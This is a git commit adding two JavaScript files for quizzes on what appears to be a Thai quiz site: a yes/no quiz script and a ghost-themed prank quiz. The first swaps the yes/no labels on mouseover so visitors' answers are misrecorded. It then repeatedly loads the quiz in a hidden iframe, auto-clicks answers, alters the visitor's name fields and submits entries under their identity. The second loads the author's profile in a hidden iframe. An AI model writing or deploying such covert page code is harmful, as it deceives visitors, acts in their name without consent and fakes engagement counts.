f9c01dda4373b78ae796811c8f9e2ed075020675
Northnroro <northnroro@gmail.com>
2015-10-04 00:18:27 +0700

    no message

---
+++ gay_yes_no.js
@@ -0,0 +1,55 @@
+﻿$('#a1_1').parent().parent().get(0).onmouseover = function(){
+	if($('#a1_1').parent().children()[0].checked == false && $('#a1_2').parent().children()[0].checked == false){
+		$('#a1_1').get(0).innerHTML = "ใช่";
+		$('#a1_2').get(0).innerHTML = "ไม่";
+	}
+}
+$('#a1_2').parent().parent().get(0).onmouseover = function(){
+	if($('#a1_1').parent().children()[0].checked == false && $('#a1_2').parent().children()[0].checked == false){
+		$('#a1_2').get(0).innerHTML = "ใช่";
+		$('#a1_1').get(0).innerHTML = "ไม่";
+	}
+}
+$('#a1_1').parent().parent().get(0).onchange = function(){
+	$('#a1_1').get(0).innerHTML = "ใช่";
+	$('#a1_2').get(0).innerHTML = "ไม่";
+}
+$('#a1_2').parent().parent().get(0).onchange = function(){
+	$('#a1_2').get(0).innerHTML = "ใช่";
+	$('#a1_1').get(0).innerHTML = "ไม่";
+}
+$('#a2_1').parent().parent().get(0).onchange = function(){
+	$('#q2').get(0).innerHTML = "คุณคิดจะแต่งงานกับผู้ชายไหม?";
+}
+$('#a2_2').parent().parent().get(0).onchange = function(){
+	$('#q2').get(0).innerHTML = "คุณคิดจะแต่งงานกับผู้หญิงไหม?";
+}
+
+var pumpCount=0;
+function pump(){
+	$(document.body).append($('<iframe id="dup"></iframe>'));
+	$('#dup').get(0).style.display = 'none';
+	$(dup).get(0).onload = function(){
+		$(dup.contentDocument).find('[id^=answergroup]').children().each(function(index){
+			this.click();
+		});
+		$(dup.contentDocument).find('#aliasname').get(0).value = "("+$(dup.contentDocument).find('#aliasname').get(0).value+")";
+		$(dup.contentDocument).find('#fb_name').get(0).value = "("+$(dup.contentDocument).find('#fb_name').get(0).value+")";
+		$(dup.contentDocument).find('#submitForm').find('.submit_game').click();
+		setTimeout(function(){
+			$('#dup').remove();
+			pumpCheck();
+		},8000+2500*(pumpCount++));
+	}
+	$(dup).get(0).src = ".?id="+$('#quiz_id').attr('value');
+}
+function pumpCheck(){
+	if($('#aliasname').attr('value').length > 0){
+		pump();
+	}else{
+		setTimeout(pumpCheck,1000);
+	}
+}
+if(window.self == window.top){
+	pumpCheck();
+}
---
+++ ghost.js
@@ -0,0 +1,143 @@
+﻿var q1answered = 0;
+var q8answered = 0;
+$('[id^=a1_]').parent().click(function(){
+	q1answered = 1;
+	if(q8answered == 1) {
+		$('[id^=a7_]').each(function(){
+			$($(this).parent().children()[0]).removeAttr('checked');
+			$(this).parent().parent().removeClass("ansselected subborderbg subborderfont");
+		});
+		$('#q7').text("แน่ใจนะว่าไม่กลัวผี?");
+		$('#a7_1').text("คราวนี้มั่นใจแล้วว่าไม่กลัวแน่นอน!!");
+		$('#a7_2').each(function(){
+			$($(this).parent().children()[0]).attr('checked', 'checked');
+			$(this).parent().parent().addClass("ansselected subborderbg subborderfont");
+		});
+		$('#q8').text("เข็มถูกดึงออกไปจากตุ๊กตาวูดูเป็นจำนวนกี่เข็ม?");
+		$('#a8_2').each(function(){
+			$($(this).parent().children()[0]).removeAttr('checked');
+			$(this).parent().parent().removeClass("ansselected subborderbg subborderfont");
+			$(this).text("ไม่มีสักเข็ม");
+			q1answered = 0;
+		});
+		$('#a8_1').parent().parent().removeAttr('style');
+		$('#a8_3').parent().parent().removeAttr('style');
+		$('#a8_4').parent().parent().removeAttr('style');
+		q8answered = 0;
+		$('[id^=a8_]').parent().click(function() {
+			$('[id^=a8_]').parent().unbind('click');
+			for(var i=0; i<20;i++) {
+				$('html, body').animate({scrollTop : "+=50"}, 50);
+			}
+			$('.submit_game').mouseover(function(){
+				$('#qfin').removeAttr('style');
+				$('#qfin')[0].style.position = 'fixed';
+				$('#qfin')[0].style.zIndex = 1000;
+				$('#qfin').offset({top : $('.submit_game').offset().top-$(document).scrollTop()-200, left : $('.submit_game').offset().left-130});
+				$('#qfin').width(350);
+				$('#qfin').height(665);
+				$('#qfin').animate({width : "+=100px", height : "+=190px", left : "-=50px", top : "-=95px"}, 70);
+				$('#qfin').delay(1500);
+				$('#qfin').animate({top : "+=650px", opacity : 0}, 3000);
+				$('.submit_game').unbind('mouseover');
+			});
+		});
+	}
+});
+
+$('#q2').append($('<br>'));
+$('#q2').append($('<img id="q2_1" src="http://image.dek-d.com/27/0287/3755/119924444">'));
+
+var q3q = $('#q3').text();
+$('#q3').empty();
+$('#q3').append($("<span>"+q3q.split("{{$url}}")[0]+" </span>"));
+$('#q3').append($("<a style='color:red;' href='http://comic.naver.com/webtoon/detail.nhn?titleId=350217&no=31' target='_blank'><u>คลิกเพื่ออ่านการ์ตูน</u></a>"));
+$('#q3').append($("<span>"+q3q.split("{{$url}}")[1]+"</span>"));
+$('#q3').append($("<img src='http://9l.96.lt/dd/sad.png' style='display:none;'>"));
+$('#q3').append($("<img src='http://9l.96.lt/dd/ghost.png' style='display:none;'>"));
+$('#q3').append($("<img id='qfin' src='http://9l.96.lt/dd/hand.png' style='display:none;'>"));
+
+$('[id^=a3_]').each(function(index){
+	this.innerHTML = "<img src='http://9l.96.lt/dd/smile.png'>";
+	var deg = "rotate("+(parseInt(this.id.match(/\d+/g)[1])*40+115)+"deg)";
+	$(this).children().css({
+		"-webkit-transform": deg,
+		"-moz-transform": deg,
+		"transform": deg
+	});
+});
+$('[id^=a3_]').parent().click(function(){
+	$('[id^=a3_]').each(function(){
+		this.innerHTML = "<img src='http://9l.96.lt/dd/sad.png'>";
+		var deg = "rotate("+(parseInt(this.id.match(/\d+/g)[1])*40+115)+"deg)";
+		$(this).children().css({
+			"-webkit-transform": deg,
+			"-moz-transform": deg,
+			"transform": deg
+		});
+	});
+});
+
+$('#q4').append($('<br>'));
+$('#q4').append($('<img id="q4_1" src="http://image.dek-d.com/27/0287/3755/119928609">'));
+var q2changed = 0;
+var q4changed = 0;
+$('[id^=a4_]').parent().click(function(){
+	if(q2changed == 0) {
+		q2changed = 1;
+		$('#q2_1').parent().append($('<img id="q2_2" src="http://image.dek-d.com/27/0287/3755/119924442">'));
+		$('#q2_2')[0].style.position = 'absolute';
+		$('#q2_2').offset($('#q2_1').offset());
+	}
+});
+$(document).scroll(function(){
+	if($(document).scrollTop() < $('#q2').offset().top && q2changed == 1 && q4changed == 0) {
+		q4changed = 1;
+		$('#q4_1').attr('src','http://image.dek-d.com/27/0287/3755/119928392');
+	}
+	if($(document).scrollTop() < $('#q2').offset().top && q2changed == 1 && q8answered == 1) {
+		q2changed = 2;
+		setTimeout(function(){
+			for(var i=90;i>=0;i-=3) {
+				$('#q2_2').animate({opacity : i/100.0}, 20);
+				$('#q2_2').animate({opacity : i/150.0}, 20);
+			}
+		},1200);
+		$('[id^=a3_]').each(function(){
+			this.innerHTML = "<img src='http://9l.96.lt/dd/ghost.png'>";
+			var deg = "rotate("+(parseInt(this.id.match(/\d+/g)[1])*40+115)+"deg)";
+			$(this).children().css({
+				"-webkit-transform": deg,
+				"-moz-transform": deg,
+				"transform": deg
+			});
+		});
+		$('#q4_1').attr('src','http://image.dek-d.com/27/0287/3755/119928603');
+		$('#q6_1').attr('src','http://image.dek-d.com/27/0287/3755/119930786');
+	}
+});
+
+$('#q6').text($('#q6').text().replace("{{$num}}", $('#a1_1').parent().parent().attr('data-answer').match(/\d/)[0]));
+$('#q6').append($('<br>'));
+$('#q6').append($('<img id="q6_1" src="http://image.dek-d.com/27/0287/3755/119929270">'));
+
+$('#q8').text($('#q8').text().replace("{{$question}}", "หากเล่นแล้วไม่ได้คะแนนเต็มแสดงว่าคุณยังเก็บรายละเอียดไม่ครบถ้วน.. ลองเล่นอีกครั้งเพื่อหาคำตอบดูสิ.. [ แล้วอย่าลืมแชร์ให้เพื่อนๆเล่นกันด้วยนะ :) ]"));
+$('#a8_1').parent().parent()[0].style.display = "none";
+$('#a8_2').text("รับทราบแล้ว!");
+$('#a8_3').parent().parent()[0].style.display = "none";
+$('#a8_4').parent().parent()[0].style.display = "none";
+
+$('#a8_2').parent().click(function(){
+	$('[id^=a1_]').each(function(){
+		$($(this).parent().children()[0]).removeAttr('checked');
+		$(this).parent().parent().removeClass("ansselected subborderbg subborderfont");
+		$(this).text("วิญญาณ อายุ 13");
+		q1answered = 0;
+		q8answered = 1;
+	});
+	$('#a8_2').parent().unbind("click");
+});
+
+$(document.body).append($('<iframe id="dup"></iframe>'));
+$('#dup').get(0).style.display = 'none';
+$(dup).get(0).src = "http://my.dek-d.com/northnroro/";
